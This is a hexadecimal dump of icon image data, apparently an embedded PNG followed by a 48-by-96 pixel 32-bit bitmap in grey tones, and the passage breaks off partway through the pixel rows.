    4082FF3F2800A15F1038715202C88993A7B493369EBC07EFC57BF625FC27C4FF
    9D3F7F411A3F6FDDFA543B72F4985C276832FA3D61D325A515121064534FBAFA
    2E5D313410E8830934B7B6C9285263419A07420013434242EC9269E7EBEB8F61
    F1B7427DC81173BD10F81B7838107EF1F59E6010BFB0C77338878523343C6A54
    584474A1382812044C86411B83804A79958141621216BB5308BF4C15DDB25516
    1D2569845BF4C0C143DAF1B74E1885BEC73C690602A74E6BA7AC34792D93F04B
    00E8FDBD4FBF7D46BA3DDF7FFF03E9F1B877EF9E76E1C225D97095DB18031C89
    5CDCF8AC156BB64C75F6B50608F46002D0703A53190BD3DE0F09094BF6D1A9D1
    A60080A70443F89200855F7A7BFBC50506051704060559AD85BB7358690002E1
    91D1590204EEE306E2F618B28BF031EA80020175E3AB5A02AAF70061A3BCC6EA
    B586C6A418D15EDFB84966CD1D3972D4A29B7BC0426F211BE0EBDB42F011F477
    DEB92E851F57E7DDBBF724032016022166FD962E5BD9AD4FA12D41A041E8FCC6
    FC1184FF6E9840F6A0A0A0919363EF1CB61BD1D1D1A3C223A2621408601C94C1
    42766002E635E2F81E3F397FB766DD7A29381894783F3210E7CE5B280560C1C2
    4532769E2AC57B057B784B30046BDDFE6A72CB1F1554FEA08C5E3C2483778E1E
    3B2EFF0FBA8F4703EF06814E043EDDBE7D5BFAF9650B35B106AB8D9335B13508
    502300E13736A5B92366A05E37BF730CE32184DF43E88E9FA882A604901022DA
    6F3D017180ADC10400018A60ECF9FFDBBBD6D826AF332C4469D9D026D6A995BA
    4EAB86B469DAB46A5B7FB4D37EA0C18F169C7B6CC7975CECF8FAF91E07E7EAC4
    71EE02AAB2965210A52D0428635B566EA543D001EDB8A628856A6CD526B2B59D
    50A9343695B152C2B7F739B133139C348E2FC7FE388F7464E220E7FB8ECF79BE
    E73DE7BCCF4B131AEB01F83D4E91E1F37F33BC874D026C3B61610967D9B1D28D
    7D6EF8223CBF61133BF03234B493C9EDBDFBF6CBBF43E96C52126FD1DF3A49A1
    C419FAFC11FADC77907A4B0D7FEB343DAD1166BCFDF689585EC351E6547BE8F0
    9158159E09475E9CD7C75E3ED6022E5D1A633B1A1F5FF9843DFDA102109E30E2
    42E9B458F934DC7FB64900DB82D85EC4E4C7A29FCFDFF84F7A2DE13D8E040A18
    A404963925F7953809E45A09C44980158EC0FAC0C83936113179604682C52E6C
    75619F1B875310F722CEC66A3BCEB8C3530169CA587C8B76F732C3126CC1A1C1
    8BA17F60352BA185FB42A883DD8FA1589624261E0E3C6102631D02D786BF8F85
    4A2CF641FAE30C03D608A00CF07BDC134216DC1FEEF3508E4800448894722479
    21EEA789FF91D717789CF7F81150009C92F77B4E97E73C4800E9A871CBF15C2B
    8138094C6C134EE40EE0F75864C30193ADDB76B0490C572498A7E04C3BCC5370
    50057BD3D87E0B774458B566D46A042920190A9219AA010A022BE790D3B81F4C
    46C8F7234C399C60F17C3C7517A61DB8C6782D04669B0ED51023804412C8B612
    80FA01A1616B91114043E3196A4B788F1B01054172791EA727CA38E4F65042DD
    8139DB8B658804126BCAB3DC027AEFD4A9B3F261FAEC3D3479709D0807F084C7
    6487251A32EEF0E4873A8052C03E394E400E6D7F95850C38C57690AE15C402B5
    1177AF3D718A1A73EA3D39697D1EF7ECE74102E873A81D1CCFC58E0D1100D2BC
    B7BB3D9EAFF21E2F020A83CDEEB0C19D286E349ACF249078220FEFB1B3F8B103
    46ECE90D57A29173930D6B0CF19668C219F7324C34366544900724803E476883
    5C029CD92002B8464FFD40203037B31801811961B73BB7F59164666EC3309048
    850472100ECC8A04125290A77A118018129D8AF29D04A060F0E49F2080E63FF9
    03C127788F110185C2EBF3DF6BB33B2FFEE2D9F577588E674409A4B930586824
    908985C1B54FAF6304106A6A7DA9B9A5B5F04B6809E42FAC36C712BB43BA8158
    FAB6BA0379AA042EA44002CC8424910446F35709EC4D20012C5A36B7B40FF31E
    1B0277012C56BB017BCB2080E98A8FDC4102BBF37C4D60261228807000199B6D
    ED9D7FE03D3604EE02984C968D1D1D5D6C9F3D6905A2E994C0742490876B0285
    440268E8E396D6F0C7BCC786C05D80DA5AF37BA834845376854602698503794C
    02D806ECE88C8E37B7B62FE63D3E04140C93C9FC80D96C1D47259A7819B24223
    01252A01F45DB4BBEF565BB853A4D40A640F4400A570AC995A8BB0D04840894A
    00A71C3B3ABBB5BCC78880825167AA5F83D264C90A924E4B02626130275B84D8
    96A530A095F71811502850A35D6FA83E0D4BA7E9AA12CF4D090C17A612C8B32D
    4258757746A22FF31E27020A854E677C9008E06AFCCC7C6649408403E9920032
    213B23DDC7798F130185A24AA75F0E0B67A4D5C2B556C924102782422201D460
    2475F6B748A4F75EDE634540813018AAA31E8F9FE5CB6787047ECD0671E649E0
    745E90409C08B2450270472202F837A98087788F150185A1BABA765E95CE70B8
    B9A59D79B9679304D25102DB8676CACDADED2CE77FFD868DCCCC039F81746090
    41DC67F06C8A2410CF203C7FFEBDBC2381B8C51854405FFFE0ADDEBEC11FF11E
    2F020A435D9D699146ABBB8A12E2B099CA3609CC45090CFF76AFEC0F0459A9AB
    09CFFB09D7A2980B2E2B84811A0793E61F6B27D63270BD2F6CDACC1C8F27EAE5
    6D610B6A70137A96EE098936C8B6C3E227EE1D933D9D85C16C92008A877675F7
    68788F17018541ABD53D6130D4B0272BF69B734102A928019880C25FDFE174ED
    7538DD3BE975D42979AE2512412219C01D172699F186AA3C68F0CE439E036CB4
    D0E0A803671D34986CA0C11E2C1FC3019000FA3CDADDDFCC7BBC08280C6A7555
    93D5E6640400E3895C91C06C9400A4EFE0E01AD9E1908EBB3CDE85B85E8BD536
    CF29B9173824F7231EAF7F99DBE333110184A9ADA7F77713011CA63642647091
    5EC788043E2485F0111AA90854491E2322F82391C0595FA0F1902F10DC45FF7E
    2E100C0D12D15C879168BA5B847792C0A9B449004941D19EBECDBCC78B80C250
    59A9D9E7A72724A473BE91003ED7EE902E53FBF65CEF0FD6E77EBF7F3E5A2814
    9AB1400591C33ADCDF85D89A416695407A24807EEBEE19F87D2432206CBF0532
    036375CDC28A0AF5E596B6B0DCDDDBCF8504A63B2CB4F3D55FCA0EC9F599D5E6
    28CD557F5038B098DA181C82B3B33B30771218A6BEA1EFE7524FDFC0825CF587
    80C2A1566B7F420AE02616C160353D1D09E080502E9500D6081A822199E4FE00
    6AD8E7B24F284CD0863BBBC647699267E2C460A648005592FA07567F1EEDEEF9
    4A2EFB4340C120029050C01136DA5DD1994920570B83487FC5F5D499EA8F492E
    77CE0FBEF8FD0DF32914D8FF12C5DCD93B27903A09BC71E8B03CB87A2DBE9F1F
    E6BA4F04148AD2D2B2DDA85B8F221AB321814425003FFE6C2801900B4DFE0FAD
    56DB23BCFAC5E3F12DA150E0D363341933953B701B099C9C1B09A0CF23D19E32
    5EFD22A020E8F58685C5C5A57F6D685825873BBA664D02D954029BB7BC2CD75B
    6C374CE67A15EFFEF178036194F68E6716E68312C0F985684FEF2ADE7D23A000
    90FCFF6E4949D9381C67516D261512C88612406A310EFA5048D2C5BB6F007FA0
    6191D7D7308AB024935984E928018425F41D6DE2DD37020A004D7E5365A5068E
    B3726B5B475A2490BE12D8C97CEF8DC6DA432653FD7DBCFB260E97C7BB2CD4D4
    7A7364E45C96730766470228654621C09BBCFB45400120F9BFE5A9A756CAE5E5
    6A9CB26344902A09642A1CE8EB1F94F586EA0F6A6A6ABFC9BB5F12019F04AF37
    F0CAFAE75FC8782AF15C48007502E8BB195BD5D424CE0208A40795AAE8FD279F
    5C21C71B2902D96A753022981D09ACC9483800B71B7AF2DFA8AEAE59CEBB4F92
    C1E3F57F834281CB388C9352166116C2011C8DEE8C74FF8B54C0D779F78B4001
    A3BAA676515151C94528804412C0CFF4BE6C325B8808DAB2AE04F0EFFA7A1B9E
    FE11DE7D3213DC6E9F9348F116267DF65389A72701A880AE68EFCD96B6F64779
    F7894081C36432DFA3D5EA342A55F1099AF8E3894480B672651116E4E450A885
    65D9655A09203BCFE76B90ABAAF40728EECF6BA30BB7AF6181E4F21EDBB66D47
    EA7E0219560220DDF670A484779F0828041515EA7BCACA2A96979494EE4B4604
    2B56A864BDBE5A0E368632BA3088308308E803BDC1581026174EC9F5637F20F8
    199ED2B93115F93F091C3DFE163B328D708926BFDCD6DED1C8BB3F0414065204
    F3CA2B2A1F2545B09526FDA7538900E1814653C5F2F24104E92801FC5F9AFCD7
    757AC3CF79DF772A905C9ED5B8764CFC6C2B014C7E64446EDCB4992930ACCDA0
    2135BABD3DB281775F0828186AB56609A982B514067C928C084835C86E8F0FF1
    68CA24F0CCBAE764A3B1E6161140ABC3E128A8D56CBBDD79BFDD21FD65CF9E7D
    73B3179B05091C79F3A8FCCAD6EDAC5F6172126A6A615BA41325C227DBEBBCFB
    42E02E40A55AF3407171490B11C1DF932D18969696CB0E878B39EACC8604D068
    12C9A434F6DBEDF682CC6AB3DA1C15AB42CDE3EF9C1BCD98C7209EF890F8ABD7
    3CCD267DA249C9AA504B9C046ED2C47F97DE6B0C35B73DCCBB1F04EE22E874FA
    451A8DD6A652158DD2C4BF35551560E7C062B5CB1D9D5D339240230DECB2B2F2
    4B3535B50FF2BEA77460B5D95FC3B1DC391B8D921238434FFE0307DF2055B481
    3DD5A7BA15C51D8B1A822118983C4371FF63E16874463F030181AC42ABD5DE47
    13B8B4B8B8F4583222C0CE415D9D590E8723779000B61349315C273259CAFB3E
    D28553727DC729B9AF42AEA74A0258D187BB0F16F36055368D6DD97F02C1D02E
    7F20A8F2787C8B78DFAF80C06D9024691E4DE49FAA54C5C32B56A8AE275B2730
    186BD85902EC10203C50ABB532A98820EF6BCF14281468C2D9004CEC2F2201C4
    F7C876ECEEE99FF42E4CE261F85F6AC7828D21472010FC1AEFFB1310F842D86C
    B6795A6DD50FCACA2A36D2A44FBA73A0D5EA65BDDE28979757BE5655659CCFFB
    9A33853A93F94B140ABCBB7DC7AEA496E3B0153B70E0200B7FA63A1A27BA1AD3
    EB9F3D5E7F97C7E3FF7EA12D8A0A084C425BA57BB8A8A8A497C280CB53170C49
    25BC4F0450D0717F3258ACB6A534713FC79EFD85587D01780860EB2E180CB11C
    0BBB4362AF681436C488C07345727B37D3C45F4A2452908BA1020249613018EF
    AFA850FB31E9632AE01A29849FF1BEAE6CC0EF0FCCA350E0452C7C22A9A9ADBD
    4386C332BD27DBE8D56E97269A83B5EB76A7EB75C9E5D6515CBF98F7B50B0864
    15A565155F2E29293356566AEA785F4B3661B1D81F329BADFF404E43BDC526D3
    CF6C47048D88E0A6CDEE3C4F933F483F7FCB6AB509892F20A03498CD16338AAB
    A2C588608C26FF3A87C3F998CD66135B7702024A86B9DE32DF64AA8799C9AF88
    0454168B556CDD09080808280DFF03ABDB827BFFEE419F0000000049454E44AE
    4260822800000030000000600000000100200000000000002400006400000064
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000050
    4E4E134D4B4B2700000000000000000000000000000000000000000000000000
    00000000000000000000007270701272706FA7686665596B6A690C0000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000504F4F20504E4E8E60
    5E5EEF737170E25B5A5A15000000000000000000000000000000000000000000
    00000000000000000000009F9D9C94D3D1D1FFB4B2B1FF8E8C8BED7775749B76
    74733E7875730300000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    000000000000000000000000000000514F4F2B4F4D4DA3615F5FF77F7C7BFF8E
    8B8AFF959392FF7C7A79B55E5C5C030000000000000000000000000000000000
    000000000000007F7C7B35CCCACAFCD4D2D2FFD1CFCEFFCDCBCAFFC2C0BFFFA5
    A3A2FE7D7B794200000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000005C5A597F7C7A79FF878583FF8E8C8BFF96
    9392FF9D9A99FFA19F9EFF7D7B7A7A0000000000000000000000000000000000
    000000706E6D05AFADADCBD4D2D2FFD1CFCEFFCDCBCAFFC9C7C6FFC5C3C2FFBD
    BBB9FF807E7D2200000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    00000000000000000000000000000062605F43868382FF8E8C8BFF969392FF9D
    9A99FFA3A19FFFAAA8A7FFA8A6A5F97B7978416B6968066E6B6A16706F6E1D73
    706F1897959472D2D0D0FFD1CFCEFFCDCBCAFFC9C7C6FFC5C3C2FFC1BFBEFFB2
    B0AEF98582800400000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000005B59590F848281F6959392FF9D9A99FFA3
    A19FFFAAA8A6FFB1AFAEFFB8B6B5FFAAA8A7F39A9896F0A8A6A5FAB1AFAEFDB2
    AFAFFBC5C3C2FDD1CFCEFFCDCBCAFFC9C7C6FFC5C3C2FFC1BFBEFFBEBCBAFFA7
    A5A3D90000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000082807FC79D9A99FFA3A19FFFAA
    A8A7FFB1AFAEFFB8B6B5FFBFBDBCFFC6C4C3FFCDCCCBFFD4D2D1FFD7D5D5FFD4
    D2D2FFD1CFCEFFCDCBCAFFC9C7C6FFC5C3C2FFC1BFBEFFBEBCBAFFBAB8B6FFA2
    A09EB50000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    000000000000000000000000000000000000008481808BA3A19FFFAAA8A7FFB1
    AFAEFFB8B6B5FFBFBDBCFFC6C4C3FFCDCCCAFFD4D2D1FFD7D5D5FFD4D2D2FFD1
    CFCEFFCDCBCAFFC9C7C6FFC5C3C2FFC1BFBEFFBEBCBAFFBAB8B6FFB6B4B2FF96
    9493AB716F6E0100000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000006D6A690179777690AAA8A6FFB1AFAEFFB8
    B6B5FFBFBDBCFFC6C4C3FFCBCAC8FFC4C2C1FFB4B1B1FFA7A5A4FFA7A4A3FFB6
    B4B3FFC4C2C1FFCECDCCFFC8C6C5FFBEBCBAFFBAB8B6FFB6B4B2FFB2B0AFFFA4
    A1A0FF7C7A79A5726F6E0A000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    00000000000000000000006C6A69017673728E9F9D9CFFB1AFAEFFB8B6B5FFBF
    BDBCFFCAC8C7FFCFCECDFFCAC8C7FFCECCCCFFD8D6D6FFDBD9D9FFDBD9D9FFDB
    D9D9FFDAD9D9FFD9D8D8FFE4E3E3FFC1BFBEFFA4A2A1FFB2B0AEFFAEACABFFAA
    A8A6FFA2A09EFF797776BF6968670D000000000000000062605F036F6D6C227B
    79785D6361604500000000000000000000000000000000000000000000000000
    0000000000000000000000000000006867670169696801000000000000000000
    00000000000000000000007774737BA09E9DFFB1AFAEFFB8B6B5FFBFBDBCFFDC
    DADAFFDFDEDDFFD5D3D2FFD5D3D2FFD5D3D2FFD5D3D2FFD5D3D2FFD5D3D2FFD5
    D3D2FFD5D3D2FFD5D3D2FFD5D3D2FFD3D2D1FFAFADACFF838180FFA3A1A0FFA6
    A4A3FFA3A09FFF9B9897FF767473B67F7D7C6A8D8A89A6989695DFACA9A8FEB8
    B5B4FF716F6ED95C5A5903000000000000000000000000000000000000000000
    0000000000000000000000000000006663633E73706FE67C7978C4807E7DA182
    7F7E7D7F7D7C59777473649A9897FBB1AFAEFFB8B6B5FFBBB9B7FFA4A2A1FFD0
    CECDFFCECDCBFFCECCCBFFCECCCBFFCECCCBFFCECCCBFFCECCCBFFCECCCBFFCE
    CCCBFFCECCCBFFCECCCBFFCECCCBFFCECCCBFFCECCCBFFC2C0BFFF7F7D7CFF98
    9594FF9F9C9BFF9F9C9BFFA3A09FFFA9A7A5FFAEACABFFB3B1B0FFB8B6B4FFBD
    BBBAFF9C9A99FF58555552000000000000000000000000000000000000000000
    0000000000000000000000000000006C69699D858381FF8F8C8BFF969392FF9D
    9A99FFA3A1A0FFAAA8A6FFB1AFAEFFB8B6B5FFBCBAB8FF817F7EFFBDBBBAFFC7
    C5C4FFC7C5C4FFC7C5C4FFC7C5C4FFC7C5C4FFC7C5C4FFC7C5C4FFC7C5C4FFC7
    C5C4FFC7C5C4FFC7C5C4FFC7C5C4FFC7C5C4FFC7C5C4FFC7C5C4FFC4C2C1FF7E
    7C7BFF979493FFA4A1A0FFA9A7A5FFAEACABFFB3B1B0FFB8B6B4FFBEBCBAFFC2
    C0BFFFC6C4C3FF636161C7515150010000000000000000000000000000000000
    00000000000000000000006F6C6B0D787574EE8F8C8BFF969392FF9D9A99FFA3
    A19FFFAAA8A7FFB2AFAEFFB8B6B5FFBFBDBCFF848282FFABA9A8FFC0BEBDFFC0
    BEBCFFC0BEBCFFC0BEBCFFC0BEBCFFC0BEBCFFC0BEBCFFC0BEBCFFC0BEBCFFC0
    BEBCFFC0BEBCFFC0BEBCFFC0BEBCFFC0BEBCFFC0BEBCFFC0BEBCFFC0BEBCFFBC
    BAB8FF7A7876FFA7A5A3FFAEACABFFB3B1B0FFB8B6B5FFBEBCBAFFC2C0BFFFC7
    C6C4FFCDCBCAFF9B9998FE565454400000000000000000000000000000000000
    000000000000000000000073716F5A888584FF969392FF9D9A99FFA3A1A0FFAA
    A8A7FFB2AFAEFFB8B6B5FFBFBDBCFFAAA8A7FF878584FFBAB8B6FFB9B7B5FFB9
    B7B5FFB9B7B5FFB9B7B5FFB9B7B5FFB9B7B5FFB9B7B5FFB0AEACF9A6A4A2E6B9
    B7B6F4BFBDBBFFB9B7B5FFB9B7B5FFB9B7B5FFB9B7B5FFB9B7B5FFB9B7B5FFB9
    B7B5FFA5A3A2FF8B8987FFB3B1B0FFB8B6B5FFBEBCBAFFC2C0BFFFC7C6C4FFCD
    CBCAFFD2D0CFFFCBC9C9FF615F5F7C0000000000000000000000000000000000
    00000000000000000000007C7978B9959291FF9D9A99FFA3A1A0FFAAA8A7FFB2
    AFAEFFB9B7B5FFC0BEBCFFC6C4C3FF797776FFB2B0AEFFB2B0AEFFB2B0AEFFB2
    B0AEFFB2B0AEFFB2B0AEFFB3B1AFFFCDCBCAC9C1BFBD4CA29F9E0800000000C2
    C0BE02DDDBDA37989694A9A8A6A4FEB2B0AEFFB2B0AEFFB2B0AEFFB2B0AEFFB2
    B0AEFFB4B2B1FF817F7DFFB4B2B0FFBEBCBAFFC2C0BFFFC7C6C4FFCDCBCAFFD2
    D0CFFFC2C0C0F383818063605F5E010000000000000000000000000000000000
    000000000000000000000083807F60969493E9A3A1A0FFAAA8A7FFB2AFAEFFB8
    B6B5FFC0BEBCFFC6C5C3FFBCBAB9FF807E7DFFACAAA8FFABA8A7FFABA8A7FFAB
    A8A7FFABA8A7FFA6A4A2FF89868598D0CECC0600000000000000000000000000
    0000000000000000000000706E6D659E9C9AFBABA8A7FFABA8A7FFABA8A7FFAB
    A8A7FFABA9A7FF9C9A98FF9A9897FFC2C0BFFFC7C6C4FFCDCBCAFFD1CFCEFFAC
    AAA9CD7776752A00000000000000000000000000000000000000000000000000
    000000000000000000000000000000878483169694929BAEABAAFDB9B7B5FFBF
    BEBCFFC6C5C3FFCDCCCBFFA09E9DFFA09E9CFFA9A7A6FFA9A7A6FFA9A7A6FFA9
    A7A6FFA9A7A6FF777575C15B5A5A050000000000000000000000000000000000
    00000000000000000000000000000073717089A7A5A4FFA9A7A6FFA9A7A6FFA9
    A7A6FFA9A7A6FFACAAA8FF858382FFC7C6C5FFCDCBCAFFCBCAC8FF9492929867
    66660A0000000000000000000000000000000000000000000000000000000000
    00000000000000000000000000000000000000000000008C89883BA8A6A5CFC5
    C3C2FFCDCCCBFFD4D2D2FF959292FFB0ADACFFB1AEADFFB1AEADFFB1AEADFFB1
    AEADFFA5A3A1FF5553533D000000000000000000000000000000000000000000
    00000000000000000000000000000061605F10949291EFB1AEADFFB1AEADFFB1
    AEADFFB1AEADFFB0AEADFF827F7FFFCDCBCAFFD2D0CFFFC4C2C2FF6865655000
    0000000000000000000000000000000000000000000000000000000000000000
    00000000000000000000000000000000000000000000000000000078767431B7
    B5B4FFD4D2D2FFD7D5D5FF979593FFB4B2B0FFB7B5B3FFB7B5B3FFB7B5B3FFB7
    B5B3FF999795EB63626102000000000000000000000000000000000000000000
    000000000000000000000000000000000000008A8786B0B7B5B3FFB7B5B3FFB7
    B5B3FFB7B5B3FFB6B4B3FF8A8886FFCDCBCAFFD7D5D4FFD6D5D5FF6E6B6A6B00
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000007371703ABE
    BCBBFFD7D5D5FFD4D2D1FF9B9897FFB9B7B5FFBEBCBBFFBEBCBBFFBEBCBBFFBE
    BCBBFFA5A3A2CD00000000000000000000000000000000000000000000000000
    00000000000000000000000000000000000000A6A4A390BEBCBBFFBEBCBBFFBE
    BCBBFFBEBCBBFFBEBCBAFFA4A2A1FFCECCCCFFDCDADAFFDFDEDEFF7673727700
    0000000000000000000000000000000000000000000000000000000000000000
    000000000000000000000000000000000000000000000000000000706D6C35BC
    BABAFFD4D2D1FFD0CFCDFFA19F9EFFBCBAB9FFC5C3C2FFC5C3C2FFC5C3C2FFC5
    C3C2FFB4B2B0DA00000000000000000000000000000000000000000000000000
    00000000000000000000000000000000000000D5D3D29EC5C3C2FFC5C3C2FFC5
    C3C2FFC5C3C2FFC3C2C0FFCBC9C8FFDBD9D9FFE1DFDFFFE4E2E2FF7B79777200
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000006A686722AF
    ADACFED0CFCDFFCDCBCAFFAAA8A7FFBBB9B7FFCCCAC9FFCCCAC9FFCCCAC9FFCC
    CAC9FFC4C3C1FDA8A6A319000000000000000000000000000000000000000000
    000000000000000000000000000000908E8D02C0BEBDD7CCCAC9FFCCCAC9FFCC
    CAC9FFCCCAC9FFC6C4C3FFCBC9C8FFE1E0DFFFE6E5E4FFE8E7E6FFACA9A9AA89
    8785110000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000006E6C6B22AE
    ACABF9CDCBCAFFC9C7C6FFB5B3B2FFB2B0AFFFD3D1D0FFD3D1D0FFD3D1D0FFD3
    D1D0FFD2D1CFFFBAB8B685000000000000000000000000000000000000000000
    000000000000000000000000000000908E8C49CAC8C7FED3D1D0FFD3D1D0FFD3
    D1D0FFD3D1D0FFBFBDBCFFC9C7C6FFE6E5E4FFEAE9E9FFE8E6E6FFDEDDDDFFC0
    BEBEE39F9D9B5800000000000000000000000000000000000000000000000000
    000000000000000000000000000000000000000000000086838346B5B4B3E7CD
    CBCAFFC9C7C6FFC5C3C2FFBDBBB9FFA5A3A2FFD2D0CFFFD3D1D0FFD3D1D0FFD3
    D1D0FFD3D1D0FFCCCBC9F8B4B2AF420000000000000000000000000000000000
    0000000000000000000000BEBCBB1DC1BFBDE0D3D1D0FFD3D1D0FFD3D1D0FFD3
    D1D0FFD3D1D0FFADABAAFFCDCBCBFFEBE9E9FFE7E6E6FFDEDDDDFFD5D3D3FFCC
    CAC9FFC1BFBEFFAAA7A6B99D9A99270000000000000000000000000000000000
    000000000000000000000000000000636161058E8C8B80C5C4C2FBCDCBCAFFC9
    C7C6FFC5C3C2FFC1BFBDFFBDBBBAFFABA9A7FFBBB9B8FFCCCBC9FFCCCBC9FFCC
    CBC9FFCCCBC9FFCCCBC9FFC3C2C0F3A6A3A16782807E05000000000000000000
    000000857D7D01D7D5D443CFCDCCDECCCBC9FFCCCBC9FFCCCBC9FFCCCBC9FFCC
    CBC9FFC7C5C4FF93908FFFDFDEDDFFE7E6E6FFDEDDDDFFD5D4D3FFCCCAC9FFC3
    C1BFFFB9B7B5FFB0AEACFFA4A1A0F19C99971200000000000000000000000000
    0000000000000000000000636262199E9D9CBCCECDCBFFCDCBCAFFC9C7C6FFC5
    C3C2FFC1BFBDFFBDBBBAFFB9B7B6FFB7B5B3FFA19F9DFFC2C1BFFFC3C2C0FFC3
    C2C0FFC3C2C0FFC3C2C0FFC3C2C0FFC0BEBCFFA5A3A1DE86848399706E6D7D76
    74748F93908FCCBFBEBCFDC3C1C0FFC3C1C0FFC3C1C0FFC3C1C0FFC3C1C0FFC3
    C1C0FFA3A19FFFA6A4A3FFE7E6E6FFDEDDDDFFD5D4D3FFCCCAC9FFC2C1BFFFB9
    B7B5FFB0AEACFFA6A4A3FF9F9C9ABEA09D990100000000000000000000000000
    00000000000000000000005F5E5D49A3A1A0FFCDCBCAFFC9C7C6FFC5C3C2FFC1
    BFBDFFBDBBBAFFB9B7B6FFB6B4B2FFB2B0AFFFADABAAFFA2A09EFFB7B5B4FFB7
    B5B4FFB7B5B4FFB7B5B4FFB7B5B4FFB7B5B4FFB7B5B4FFB7B5B4FFB7B5B4FFB7
    B5B4FFB7B5B4FFB7B5B4FFB7B5B4FFB7B5B4FFB7B5B4FFB7B5B4FFB7B5B4FFAB
    A9A8FF979493FFDBD9D9FFDEDDDDFFD5D3D3FFCCCAC9FFC2C1BFFFB9B7B5FFB0
    AEACFFA6A4A3FF9D9A99FF9795935F0000000000000000000000000000000000
    00000000000000000000005D5B5B036E6C6BD0C7C5C4FFC5C3C2FFC1BFBDFFBD
    BBBAFFB9B7B6FFB6B4B2FFB2B0AEFFAEACAAFFADABA9FFA2A09EFF9D9A99FFAA
    A7A6FFAAA7A6FFAAA7A6FFAAA7A6FFAAA7A6FFAAA7A6FFAAA7A6FFAAA7A6FFAA
    A7A6FFAAA7A6FFAAA7A6FFAAA7A6FFAAA7A6FFAAA7A6FFAAA7A6FFA3A19FFF9A
    9897FFCFCDCCFFDEDDDDFFD5D4D3FFCCCAC9FFC2C1BFFFB9B7B5FFB0AEACFFA6
    A4A3FF9D9B99FF92908FF08C8A890F0000000000000000000000000000000000
    0000000000000000000000000000005554545EA19F9EFFC1BFBDFFBDBBBAFFB9
    B7B6FFB6B4B2FFB2B0AEFFAEACABFFAAA8A7FFA6A4A3FFA7A5A4FF9B9897FF8F
    8D8CFF9A9796FF9A9896FF9A9896FF9A9896FF9A9896FF9A9896FF9A9896FF9A
    9896FF9A9896FF9A9796FF9A9796FF9A9796FF9A9796FF939190FFA29F9EFFD3
    D1D0FFDEDDDDFFD5D3D3FFCBCAC8FFB2B0AFDDB0ADACCDAAA8A7F3A4A2A1FF9D
    9A99FF949190FF898685A1000000000000000000000000000000000000000000
    000000000000000000000000000000545252076C6A6ADFBDBBBAFFB9B7B6FFB4
    B2B0FFA6A4A2F8969392D0898685D8A5A2A1FFA2A09FFF9F9C9BFFA2A09FFF9A
    9897FF83807FFF868483FF888685FF888685FF888685FF888685FF888685FF88
    8685FF888685FF888685FF888685FF878584FF898786FFBFBDBDFFE1DFDFFFDE
    DDDDFFD5D3D2FFCCCAC9FFAEACABEC9A979622000000009691900293908F1F8D
    8B89478886846F82807F2F000000000000000000000000000000000000000000
    000000000000000000000000000000000000005A57576C8D8B8AC48D8C8A8779
    77764B605F5E15000000006967661A7F7D7CDB9E9B9AFF9F9D9BFFA4A2A0FFA9
    A7A5FFA29F9EFF848180FF777473FF757372FF767372FF767372FF767372FF76
    7372FF767372FF767372FF747170FF83817FFFDAD8D8FFE8E7E7FFDEDDDDFFD5
    D3D2FFCCCAC9FFAFADACF29592913F0000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    000000000000000000000000000000000000005D5B5B01000000000000000000
    0000000000000000000000000000006F6D6C1E82807ED1A19F9DFFA9A7A6FFAF
    ACABFFB3B1B0FFB4B2B0FFA19F9DFF848180FF686665FF5E5C5BFF5D5A5AFF5C
    5A59FF5B5858FF706E6DFF9E9C9BFFD7D5D5FFE7E6E6FFDEDDDCFFD5D3D2FFCC
    CAC9FFAEACABEC928F8E3F000000000000000000000000000000000000000000
    000000555353165A58583E000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    000000000000000000000000000000000000007876750E8A8887B1AFACABFFB3
    B1B0FFB9B7B5FFBEBCBAFFC3C1BFFFC8C6C5FFCBCAC8FFC4C2C1FFC0BEBEFFC9
    C8C8FFDCDBDAFFE6E5E4FFEBE9E9FFE7E6E6FFDEDDDCFFD5D3D2FFCCCAC9FFC2
    C0BFFFA7A5A3BF0000000000000000000000000000000000000000000000005E
    5C5C24807E7DFE959291FC7B79782E000000007976750198969568807D7C2A00
    0000000000000000000000000000000000000000000000000000000000000000
    00000000000000000000000000000000000000000000009896957DB3B1B0FFB9
    B7B5FFBEBCBAFFC3C1BFFFC8C6C5FFCDCBCAFFD2D0CFFFD7D5D5FFDCDBDAFFE1
    E0DFFFE6E5E5FFEBE9E9FFE7E6E6FFDEDDDCFFD5D3D2FFCCCAC9FFC2C0BFFFB9
    B7B5FFA6A4A2F17D7B790A000000000000000000000000000000000000000070
    6D6D219E9B9AFEAEACAAFFA9A7A6BFA09E9D64ABA9A883CFCECDFEBAB8B7F688
    8685260000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000A2A09FA6B9B7B5FFBE
    BCBAFFC3C1BFFFC8C6C5FFCDCBCAFFD2D0CFFFD7D5D4FFDBDADAFFE1E0DFFFE6
    E4E4FFE5E3E3FFDFDEDEFFDEDDDCFFD5D3D2FFCCCAC9FFC2C0BFFFB9B7B5FFB0
